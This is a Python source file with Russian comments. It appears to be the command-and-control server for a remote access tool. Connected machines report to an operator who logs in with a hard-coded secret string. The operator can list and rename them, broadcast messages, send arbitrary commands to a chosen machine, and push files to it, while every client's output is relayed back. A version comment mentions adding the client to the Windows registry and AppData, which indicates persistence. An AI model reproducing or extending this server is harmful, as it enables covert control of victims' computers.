# v: 0.0.1 | 11.08.2025
# v: 0.2 | 05.10.2025 <> Добавлен admin + в добовляется в реестр + добовляется в AppData
import asyncio

ip = '0.0.0.0'
port = 10000

clients = []
admin = None

async def handle_client(reader, writer):
    global admin
    addr = writer.get_extra_info('peername')
    role_bytes = await reader.read(1024)
    if not role_bytes:
        writer.close()
        await writer.wait_closed()
        return
    role = role_bytes.decode().strip()

    if role == 'I8t12ok89u-k9u!@#e4':
        admin = {'reader': reader, 'writer': writer}
        try:
            while True:

                data = await reader.read(1024)

                if not data:
                    print("[*] Админ отключился")
                    admin = None
                    break

                cmd = data.decode().strip()
                message = cmd.split(maxsplit=2)

                if message[0] == "all":
                    writer.write("Введите сообщение для всех клиентов:\n".encode())
                    await writer.drain()

                    msg_data = await reader.read(1024)
                    if not msg_data:
                        break
                    msg = msg_data.decode().strip()
                    print(msg)

                    for cl in clients:
                        try:
                            cl['writer'].write(msg.encode())
                            await cl['writer'].drain()
                        except Exception as e:
                            print(f"[!] Ошибка отправки клиенту {cl['name']}: {e}")
                    writer.write("Сообщение отправлено всем.\n".encode())
                    await writer.drain()

                elif message[0] == "name":
                    if len(message) != 3:
                        writer.write("Неправильный формат! Правильно: name <id> <новое_имя>\n".encode())
                        await writer.drain()
                        return
                
                    _, idx, new_name = message
                
                    try:
                        id = int(idx)
                        clients[id]['name'] = new_name
                        writer.write(f"Имя клиента {id} изменено на {new_name}\n".encode())
                        await writer.drain()
                    except ValueError:
                        writer.write("ID должен быть числом!\n".encode())
                        await writer.drain()
                    except:
                        writer.write("Нет такого ID".encode())
                        await writer.drain()
                
                elif message[0] == 'send':
                    await sms(admin, clients)

                elif message[0] == "list":
                    writer.write("Устройства в сети: \n".encode())
                    for i, client in enumerate(clients):
                        writer.write(f"{i}:{client['name']} \n".encode())

                else:
                    writer.write(f"Неизвестная команда: {message}\n".encode())
                    await writer.drain()
        except Exception as e:
            print(f"[!] Ошибка (admin): {e}")
        finally:
            if admin and admin['writer'] == writer:
                admin = None
            writer.close()
            await writer.wait_closed()

    else:
        client = {
            'reader': reader,
            'writer': writer,
            'name': f"{addr[0]}:{addr[1]}"
        }
        clients.append(client)
        print(f"[+] Клиент подключился: {client['name']}")
        try:
            while True:
                data = await reader.read(1024) ## принимает все сообщения от client
                if not data:
                    break
                msg = data.decode().strip()
                admin['writer'].write(msg.encode()) ## отпровляет их admin

        except Exception as e:
            print(f"[!] Ошибка (client {client['name']}): {e}")
        finally:
            clients.remove(client)
            writer.close()
            await writer.wait_closed()
            print(f"[-] Клиент {client['name']} отключён")

async def sms(admin, clients):
    writer = admin['writer']
    reader = admin['reader']

    # Показать список клиентов
    writer.write("Выберите ID клиента из списка:\n".encode())
    for i, client in enumerate(clients):
        writer.write(f"{i}: {client['name']}\n".encode())
    writer.write("Введите ID клиента: ".encode())
    await writer.drain()

    # Получить выбор ID
    id_data = await reader.read(1024)
    if not id_data:
        return
    try:
        client_id = int(id_data.decode().strip())
        client = clients[client_id]
    except (ValueError, IndexError):
        writer.write("Неверный ID клиента.\n".encode())
        await writer.drain()
        return

    # Отправка команд выбранному клиенту
    writer.write(f"Отправляйте команды клиенту {client['name']} (введите 'exit' для выхода):\n".encode())
    await writer.drain()

    while True:
        writer.write(">>> ".encode())
        await writer.drain()

        cmd_data = await reader.read(1024)
        if not cmd_data:
            break
        cmd = cmd_data.decode().strip()

        if cmd.lower() == "exit":
            writer.write("Выход из режима отправки команд.\n".encode())
            await writer.drain()
            break
        
        if cmd.lower() == "upload file":
            # Получаем от админа file_info

            client['writer'].write('upload file'.encode())
            await client['writer'].drain()

            file_info = await reader.read(1024)
            file_info = file_info.decode().strip()
            file_name, file_size = file_info.split(' | ')
            file_size = int(file_size)

            # Пересылаем file_info клиенту
            client['writer'].write(file_info.encode())
            await client['writer'].drain()

            # Подтверждаем админу, что можно отправлять файл

            # Принимаем файл от админа и пересылаем клиенту
            received = 0
            while received < file_size:
                chunk = await reader.read(min(4096, file_size - received))
                if not chunk:
                    break
                client['writer'].write(chunk)
                await client['writer'].drain()
                received += len(chunk)

            print(f"[SERVER] Файл {file_name} успешно переслан клиенту.")

            ###### ИЛИ ПОСТОРАЙСЯ УБРАТЬ ЕГО СЮДА

        try:
            client['writer'].write(cmd.encode())
            await client['writer'].drain()
            ## <--- СЮДА
        except Exception as e:
            writer.write(f"[!] Ошибка при отправке сообщения клиенту: {e}\n".encode())
            await writer.drain()
            break

async def main():
    server = await asyncio.start_server(handle_client, ip, port)
    print(f"[*] Сервер запущен на {ip}:{port}")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())


